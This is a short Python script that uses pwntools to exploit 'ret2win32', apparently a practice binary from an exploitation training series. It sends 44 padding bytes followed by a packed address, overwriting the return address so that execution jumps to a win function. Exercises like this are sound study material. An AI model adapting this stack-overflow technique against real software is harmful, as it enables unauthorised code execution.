#!/usr/bin/env python

from pwn import *


p = process("./ret2win32")
p.recv(1024)

payload = (
    "\x90" * 44 +
    p32(0x8048659)
)
p.sendline(payload)
print(p.recvall())
p.close()
